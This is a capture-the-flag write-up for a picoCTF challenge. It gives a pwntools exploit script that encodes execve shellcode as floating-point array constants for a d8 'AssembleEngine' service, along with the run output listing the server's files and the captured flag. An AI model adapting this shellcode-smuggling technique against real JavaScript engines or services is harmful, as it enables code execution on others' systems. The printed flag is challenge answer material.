Exploit [aqui](https://hackmd.io/@SBK6401/BymQzTOnh)

```
cat exploit.py                                                                                                                           ✔ 
from pwn import *
import struct

context.arch = 'amd64'

if args.REMOTE:
    ls = asm(shellcraft.execve(b"/bin/ls", ["ls"]))
    cat = asm(shellcraft.execve(b"/bin/cat", ["cat", "flag.txt"]))
    r = remote('wily-courier.picoctf.net', 53361)
else:
    ls = b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    cat = b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    r = process(['python3', 'server.py'])
log.info(f'ls shellcode: {ls}')
log.info(f'cat flag.txt shellcode: {cat}')

def Transfer2DoubleArray(shellcode):
    shell_array = []
    if len(shellcode) % 8 > 0:
        shellcode += (8 - len(shellcode) % 8) * b'\x00'
    for i in range(0, len(shellcode), 8):
        double_tmp = struct.unpack('d', shellcode[i:i+8])[0]
        shell_array.append(double_tmp)
    
    return shell_array



payload = f'AssembleEngine({Transfer2DoubleArray(ls)})'
r.recvuntil(b'Provide size. Must be < 5k:')
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())
r.close()

if args.REMOTE:
    r = remote('wily-courier.picoctf.net', 53361)
else:
    r = process(['python3', 'server.py'])
payload = f'AssembleEngine({Transfer2DoubleArray(cat)})'
r.recvuntil(b'Provide size. Must be < 5k:')
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())

```

```
python3 exploit.py REMOTE                                                                                                                ✔ 
[+] Opening connection to wily-courier.picoctf.net on port 53361: Done
[*] ls shellcode: b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[*] cat flag.txt shellcode: b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[+] Receiving all data: Done (370B)
[*] Closed connection to wily-courier.picoctf.net port 53361
AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'Dockerfile\nMakefile\nd8\nflag.txt\npackages.txt\nserver.py\nsource\nsource.tar.gz\nstart.sh\n'
Stderr b''

[+] Opening connection to wily-courier.picoctf.net on port 53361: Done
[+] Receiving all data: Done (362B)
[*] Closed connection to wily-courier.picoctf.net port 53361
AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'picoCTF{vr00m_vr00m_8011dd6c979cd7e6}\n'
Stderr b''

```
